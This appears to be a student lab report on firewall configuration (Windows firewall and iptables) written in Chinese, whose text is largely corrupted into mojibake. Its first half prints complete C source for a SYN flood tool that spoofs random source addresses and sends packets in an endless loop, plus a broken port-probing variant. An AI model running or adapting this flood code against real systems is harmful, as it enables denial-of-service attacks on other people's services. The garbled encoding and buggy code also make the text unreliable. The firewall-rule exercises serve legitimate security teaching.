len; } int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d ç«¯å£å·²ç»æ¢æµ‹\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } å‘é€tcpåŒ…åˆ°ç›®çš„æœºç¡®å®šç«¯å£çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip æŠ¥å¤´ struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; // tcp æŠ¥å¤´ struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; //TCPçš„ä¼ªæŠ¥å¤´ï¼Œåœ¨è®¡ç®—TCPçš„æ ¡éªŒå’Œæ—¶éœ€è¦åŒ…å« struct pseudohdr { unsigned int saddr; //æºç›®çš„IP unsigned int daddr; // ç›®çš„IP char zeros; // 8ä½ä¿ç•™å­—ç¬¦ ä¸€èˆ¬ç½®0 char protocol;// åè®® unsigned short length; // é•¿åº¦ }; // è¿™ä¸ªæ˜¯è®¡ç®—æ ¡éªŒå’Œçš„å‡½æ•° unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // é€šè¿‡ä¼ å…¥çš„æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€åˆå§‹åŒ– IP å¤´éƒ¨ç»“æ„ã€‚ void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } // åˆå§‹åŒ– tcp åŒ… void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 ä»£è¡¨ æ˜¯syn åŒ…ï¼Œtcpä¸‰æ¬¡è¿æ¥è¯·æ±‚çš„å¼€å§‹ tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // åˆå§‹åŒ– tcp ä¼ªæŠ¥å¤´ void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // é€šè¿‡ ç›®æ ‡IPåœ°å€ å’Œ ç›®æ ‡ç«¯å£ ç”Ÿæˆä¸€ä¸ª SYNåŒ…ï¼Œä¿å­˜åˆ°å‚æ•° packet ä¸­ï¼Œå¹¶ä¸”è¿”å›åŒ…çš„å¤§å°ã€‚ int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // åˆ›é€ åŸå§‹å¥—æ¥å­— int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* åœ¨è°ƒç”¨ socket() å‡½æ•°åˆ›å»ºå¥—æ¥å­—æ—¶ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º SOCK_RAWï¼Œè¡¨ç¤ºåˆ›å»ºçš„å¥—æ¥å­—ä¸ºåŸå§‹å¥—æ¥å­—ã€‚ç„¶åè°ƒç”¨ setsockopt() å‡½\tæ•°è®¾ç½® IP å¤´éƒ¨ç”±æˆ‘ä»¬è‡ªå·±æ„å»º */ return fd; } // ä¼ å…¥åŸå§‹å¥—æ¥å­—ã€ç›®æ ‡IPåœ°å€å’Œç›®æ ‡ç«¯å£ï¼Œç„¶åé€šè¿‡è°ƒç”¨ sendto() å‡½æ•°å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ª SYNåŒ… int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%då·²æ”»å‡»!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // ä¸»å‡½æ•° int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] ç›®çš„åœ°å€ // argc[2] ç›®çš„ç«¯å£ addr = inet_addr(argv[1]); port = atoi(argv[2]); // åˆ¤æ–­ç«¯å£æ˜¯å¦ å­˜åœ¨ if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // å¼€å¯socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for æ— é™å¾ªç¯ï¼Œå‘é€synåŒ… for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } Windowsé˜²ç«å¢™ï¼šå¤©ç½‘é˜²ç«å¢™\nLinuxé˜²ç«å¢™ï¼š iptables\nFTPæœåŠ¡å™¨ï¼šSer-U\næŠ“åŒ…å·¥å…·ï¼šWireshark\nUDPæ”»å‡»ï¼šUDP-Flood\n0x03 å®éªŒå†…å®¹ 3.1 windowsé˜²ç«å¢™ 3.1.1 è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ® åœ¨é˜²ç«å¢™ä¸­æ·»åŠ å¦‚ä¸‹è§„åˆ™ï¼š è¿™æ ·æ¥æ”¶åˆ°çš„æ‰€æœ‰TCPåŒ…éƒ½ä¼šè¢«æ‹¦æˆªï¼Œå¹¶ä¸”è¢«è®°å½•ã€‚ æ²¡æœ‰å¼€å¯é˜²ç«å¢™å‰ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œå‘é€éšæœºç«¯å£çš„tcpç¨‹åº é€šè¿‡WiresharkæŠ“åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„TCPåŒ…å¹¶æ²¡æœ‰è¢«æ‹¦æˆªã€‚ å¼€å¯é˜²ç«å¢™ï¼Œå†åº¦å¯åŠ¨ç¨‹åºã€‚ å¯ä»¥çœ‹åˆ°é˜²ç«å¢™è¿›è¡Œæé†’ï¼Œå¹¶ä¸”æ—¥å¿—é‡Œé¢æ˜¾ç¤ºäº†æ”»å‡»æœºå‘é¶æœº192.168.195.131çš„ç«¯å£tcpè¿æ¥ã€‚ å› æ­¤åŠ ä¸Šè¯¥ç«¯å£åï¼Œæ‰€æœ‰tcpåŒ…éƒ½è¢«æˆªæ–­äº†ã€‚ 3.1.2 è¿‡æ»¤R-\u0026gt;Lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ® å‘é€åˆ°ç«¯å£ä¸º21å’Œ80çš„ä¼ è¾“å±‚åè®®å¯èƒ½ä¸ºtcpä¹Ÿå¯èƒ½ä¸ºudp\nå› æ­¤ç¼–å†™è¿›å‡ºè§„åˆ™çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å¯¹TCPå’ŒUDPéƒ½è¿›è¡Œé™åˆ¶ã€‚\nUDP TCP å› ä¸ºæˆ‘çš„å®¢æˆ·ç«¯å·²ç»å¼€å¯äº†21å’Œ80ç«¯å£ï¼Œæ‰€æœ‰æˆ‘ä»¬è¿™é‡Œç›´æ¥é€‰æ‹©å·²æˆæƒå¼€æ”¾çš„ç«¯å£å³å¯ã€‚ TCP\né˜²ç«å¢™å¼€å¯å‰ï¼š\nå¯ä»¥çœ‹åˆ°TCPåŒ…å¯ä»¥å‘åˆ°æœºå™¨ã€‚ å¼€å¯é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°åœ¨æ—¥å¿—é‡Œé¢ç¨‹åºè¿æ¥80ç«¯å£è¢«æ‹’ç»ã€‚ æ”»å‡»21ç«¯å£\nå¯ä»¥çœ‹åˆ°è¿™é‡Œè¿æ¥21ç«¯å£åŒæ ·è¢«æ‹’ç»ã€‚\nUDP\nå…³é—­é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°æŠ“åˆ°udpåŒ…\nå¼€å¯é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°80ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª æ”»å‡»21ç«¯å£\nå¯ä»¥çœ‹åˆ°21ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª\n3.1.3 èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ åœ¨windows xp192.168.195.162ä¸­æ­å»ºftpæœåŠ¡å™¨ åˆ›å»ºä¸€ä¸ªftpç”¨æˆ·ï¼Œè´¦æˆ·ä¸ºadminï¼Œå¯†ç ä¸ºadminï¼› æˆ‘ä»¬åœ¨æœ¬æœºè®¿é—®æœåŠ¡å™¨ç«¯ æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°æœåŠ¡å™¨ç«¯ã€‚ è®¾ç½®è§„åˆ™ å½“æˆ‘ä»¬å‘æœåŠ¡å™¨ç«¯å‘é€ftpè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šé€šè¡Œã€‚ 3.1.4 é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ® è¿™é‡Œæˆ‘ä»¬æ˜¯åŸå…ˆçš„å®¢æˆ·ç«¯ä½œä¸ºæ–°çš„æœåŠ¡å™¨ï¼Œå¦ä¸€å°æœºå­æ¥è®¿é—®è¿™ä¸ªæ–°çš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡åŒºçš„é˜²ç«å¢™ä¸Šé…ç½®è§„åˆ™ï¼Œä»è€Œé˜»æ­¢å®¢æˆ·ç«¯ä¸‹è½½æœåŠ¡å™¨ç«¯å†…å®¹ åœ¨æ–°çš„æœåŠ¡å™¨ç«¯é…ç½®FTP å®¢æˆ·ç«¯æŸ¥çœ‹æ•ˆæœ åœ¨æœåŠ¡å™¨ç«¯é…ç½®é˜²æŠ¤å¢™è§„åˆ™ å½“æ”¶åˆ°ç«¯å£ä¸º21çš„tcpè¯·æ±‚çš„æ—¶å€™æ‹’ç»è¯¥è®¿é—®ï¼Œè¿™æ ·å°±ä¿è¯äº†å®¢æˆ·ç«¯ä¸èƒ½ä»æœåŠ¡å™¨ä¸‹è½½ã€‚ å¼€å¯é˜²ç«å¢™ ç»“æœ æˆ‘ä»¬å¯ä»¥åœ¨æ—¥å¿—é‡Œé¢çœ‹åˆ° IP192.168.195.182å¯¹å®¢æˆ·ç«¯çš„è¿æ¥è¢«æ‹’ç» åŒæ—¶ï¼Œè¯¥ç½‘é¡µä¹Ÿæ— æ³•æ‰“å¼€ï¼Œè‡ªç„¶æŸ¥çœ‹åˆ—è¡¨ä»€ä¹ˆçš„ï¼Œä¸Šä¼ ã€ä¸‹è½½éƒ½æ— æ³•è¿›è¡Œï¼Œ 3.2 Linuxé˜²ç«å¢™ iptables 3.2.1 Iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢ é¦–å…ˆé€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…å¥½iptables\n1 2 3 4 systemctl stop firewalld.service systemctl mask firewalld.service yum install iptables-services systemctl enable iptables.service ç„¶åé€šè¿‡å‘½ä»¤service iptables statusæŸ¥çœ‹æ­¤æ—¶çš„iptablesçŠ¶æ€\næ­¤æ—¶é˜²ç«å¢™ä¸ºæ‰“å¼€çŠ¶æ€ å…³é—­é˜²ç«å¢™service iptables stop\nå†åº¦æŸ¥çœ‹æ­¤æ—¶é˜²ç«å¢™çŠ¶æ€ å‘ç°æ­¤æ—¶é˜²ç«å¢™å·²å…³é—­ã€‚ æ‰“å¼€é˜²ç«å¢™service iptables start\nå†æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ é˜²ç«å¢™å·²æ‰“å¼€ 3.2.2 Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤ æŸ¥çœ‹\nå‘½ä»¤ iptables -L -n åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ å‘½ä»¤ iptables -nL â€“line-number åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ï¼Œå¸¦ç¼–å· å‘½ä»¤ iptables -L -n -t nat åˆ—å‡ºï¼ˆnatè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ æ·»åŠ \næ·»åŠ è§„åˆ™æœ‰ä¸¤ä¸ªå‚æ•°ï¼š-Aå’Œ-Iã€‚å…¶ä¸­-Aæ˜¯æ·»åŠ åˆ°è§„åˆ™çš„æœ«å°¾ï¼›-Iå¯ä»¥æ’å…¥åˆ°æŒ‡å®šä½ç½®ï¼Œæ²¡æœ‰æŒ‡å®šä½ç½®çš„è¯é»˜è®¤æ’å…¥åˆ°è§„åˆ™çš„é¦–éƒ¨ã€‚ å½“å‰è§„åˆ™ï¼š æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°å°¾éƒ¨ï¼šiptables â€“A INPUT -j ACCEPT æ„æ€ä¸ºï¼šå‘filterè¡¨ï¼ˆé»˜è®¤è¡¨ï¼‰çš„INPUTé“¾ä¸­è¿½åŠ ä¸€æ¡è§„åˆ™ï¼Œå…¶åŠŸèƒ½æ˜¯æ¥å—æºåœ°å€ä¸ºä»»æ„ã€ç›®æ ‡åœ°å€ä¸ºé˜²ç«å¢™æœ¬èº«çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚ ç¬¬å…­æ¡å³ä¸ºæˆ‘ä»¬æ–°åŠ å…¥çš„è§„åˆ™ æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°ç¬¬ä¸‰æ¡ï¼š iptables -I INPUT 3 -s 192.168.195.131 -j DROP å¯ä»¥çœ‹åˆ°æ–°è§„åˆ™æ·»åŠ åˆ°ç¬¬ä¸‰æ¡äº† åˆ é™¤\nåˆ é™¤ç”¨-Då‚æ•°\nåˆ é™¤ä¹‹å‰æ·»åŠ çš„è§„åˆ™ iptables -A INPUT -j ACCEPTï¼š\nå‘½ä»¤ï¼š iptables -D INPUT -j ACCEPT\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰æ·»åŠ çš„ç¬¬ä¸ƒæ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚ æœ‰æ—¶å€™è¦åˆ é™¤çš„è§„åˆ™å¤ªé•¿ï¼Œåˆ é™¤æ—¶è¦å†™ä¸€å¤§ä¸²ï¼Œæ—¢æµªè´¹æ—¶é—´åˆå®¹æ˜“å†™é”™ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨â€“line-numberæ‰¾å‡ºè¯¥æ¡è§„åˆ™çš„è¡Œå·ï¼Œå†é€šè¿‡è¡Œå·åˆ é™¤è§„åˆ™ã€‚è¿™é‡Œæˆ‘ä»¬åˆ é™¤ç¬¬ä¸‰è¡Œæˆ‘ä»¬æ’å…¥çš„è§„åˆ™ã€‚\nå‘½ä»¤ï¼šiptables -D INPUT 3\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ’å…¥çš„ç¬¬ä¸‰æ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚\n3.2.3 è®¾ç½®Iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ 3.2.3.1 ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡ï¼ˆé€šè¿‡PingéªŒè¯ï¼‰ æˆ‘ä»¬é¦–å…ˆå°†æ‰€æœ‰è§„åˆ™éƒ½åˆ é™¤iptables -F å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰çš„è§„åˆ™å…¨éƒ¨è¢«æ¸…é™¤æ‰ã€‚ æ­¤æ—¶æˆ‘ä»¬é€šè¿‡æœºå™¨192.168.195.131æ¥pingæˆ‘ä»¬æ­¤æ—¶çš„Linuxä¸»æœº192.168.195.174 æ­£å¸¸å¯ä»¥pingé€š ç¦æ­¢æ‰€æœ‰è¿›å…¥æœ¬åœ°æœºå™¨çš„æ•°æ®åŒ…é€šè¿‡ å‘½ä»¤å¦‚ä¸‹ï¼šiptables -I INPUT -j DROP å°†è§„åˆ™åŠ å…¥åˆ°INPUTé“¾ä¸­ æ‰€æœ‰å‘ç»™æœ¬æœºçš„åŒ…éƒ½ä¼šè¢«ä¸¢å¼ƒæ‰ æ­¤æ—¶å†åº¦pingæˆ‘ä»¬çš„æœ¬æœº192.168.195.174 å¾ˆæ˜æ˜¾çš„ä¸»æœºå·²ç»æ¥æ”¶ä¸åˆ°pingçš„åŒ…äº† 3.2.3.2 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶iptables -F\nå…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº\næˆ‘ä»¬è¿™é‡Œè®¾å®šè¿è¡Œ192.168.195.131å¯ä»¥pingé€šï¼Œå…¶ä½™çš„ä¸»æœºå‡æ— æ³•pingé€šæœºå™¨\nå‘½ä»¤ï¼š\n1 2 iptables -I INPUT -j DROP iptables -I INPUT -s 192.168.195.131 -j ACCEPT å› ä¸ºiptablesä¸­è§„åˆ™çš„æ‰§è¡Œä¸ºä»ä¸Šåˆ°ä¸‹ï¼Œæ‰€ä»¥æŒ‰ç…§ä¸Šè¿°ç»™å®šçš„ç¨‹åºæ’å…¥è§„åˆ™ã€‚\nç»“æœä¸ºï¼š\nè¿™æ ·å°±ä¿è¯æ¥æ”¶åˆ°192.168.195.131çš„åŒ…ï¼Œå…¶ä½™çš„åŒ…å‡ä¸¢å¼ƒã€‚\nè¿™é‡Œç›´æ¥æ”¾å‡ºä¸¤ä¸ªæœºå™¨é˜²ç«å¢™å¼€å¯å‰åpingçš„çŠ¶æ€ã€‚\nå…¶ä»–æœºå™¨ 192.168.195.131 3.2.3.3 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶iptables -F\nå…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº,ï¼Œå¼€å¯ç«¯å£23 å³å¯\nå‘½ä»¤ï¼š\n1 2 iptables -I INPUT -p tcp --dport 23 -j DROP iptables -I INPUT -s 192.168.195.131 -p tcp --dport 23 -j ACCEPT ç›®çš„ç«¯å£ä¸º23çš„è¢«ä¸¢å¼ƒï¼Œå› ä¸ºç¬¬äºŒæ¡è§„åˆ™é¡ºåºåœ¨ç¬¬ä¸€æ¡å‰é¢ï¼Œæ‰€æœ‰å…ˆåˆ¤æ–­æ˜¯å¦ä¸ºç‰¹å®šIPï¼Œæ˜¯çš„åˆ™æ¥å—ï¼Œå¦åˆ™ä¸¢å¼ƒã€‚ å¼€å¯é˜²ç«å¢™å‰ï¼š\n192.168.195.131\nå…¶ä»–æœºå™¨ï¼š\ntelentå‡å¯ä»¥æ­£å¸¸è¿æ¥\nå¼€å¯iptables\nå¯¹äº192.168.195.131çš„æœºå™¨\nå‘ç°ä»ç„¶å¯ä»¥æ­£å¥½è¿æ¥telnet å¯¹äºå…¶ä»–æœºå™¨\nå¯ä»¥çœ‹åˆ°è¿æ¥ä¸åˆ°telnet 0x04 é€‰åšé¢˜ 4.1 ç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ å…è®¸æœ¬æœºç™»å½•å…¶ä»–æœåŠ¡å™¨çš„ftp:192.168.195.162\nå› æ­¤è¿™é‡Œçš„é˜²ç«å¢™ä¸ºoutputå‘å¤–é¢æœåŠ¡å™¨ä»¥21ç«¯å£å‘é€è¯·æ±‚ã€‚\nå‘½ä»¤ï¼šiptables -A OUTPUT -p tcp --sport 21 -j ACCEPT\næ‰€æœ‰æºç«¯å£ä¸º21 å‘å¾€å¤–ç½‘çš„åŒ…éƒ½è¢«å…è®¸é€šè¿‡ã€‚ æ‰§è¡Œé˜²ç«å¢™ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å‘å¾€å¤–ç½‘21ç«¯å£çš„åŒ…å¯ä»¥è¢«ACCEPT ç„¶åé€šè¿‡ftp 192.168.195.131 è¾“å…¥è´¦æˆ·adminå’Œå¯†ç admin æˆ‘ä»¬æˆåŠŸè¿æ¥åˆ°äº†ftpæœåŠ¡å™¨ã€‚ 4.2 æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ã€ä¸‹è½½æ•°æ® è¿™é‡Œæˆ‘ä»¬çš„Centos 7æœ¬èº«ä½œä¸ºä¸€ä¸ªFTPæœåŠ¡å™¨æ¥ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚\nåœ¨æœ¬åœ°é…ç½®å¥½ftpç¯å¢ƒ\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¯å¢ƒå·²ç»é…ç½®å®Œæ¯• åŒæ—¶åœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®¿é—®LinuxæœåŠ¡å™¨ ä¸ºäº†ç¦æ­¢å…¶ä»–ç”¨æˆ·ä¸‹è½½æˆ‘ä»¬linuxæœåŠ¡å™¨ç«¯çš„æ‰€æœ‰æ•°æ®ï¼Œä¹Ÿé˜²æ­¢ä¸Šä¼ ,å³ç¦æ­¢ç”¨æˆ·è®¿é—®æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ã€‚\næ‰€ä»¥æœ‰å‘½ä»¤ï¼šiptables -I INPUT -p tcp --dport 21 -j DROP æ‰€æœ‰ç›®çš„ç«¯å£ä¸º21çš„æ•°æ®åŒ…éƒ½å°†è¢«ä¸¢å¼ƒ 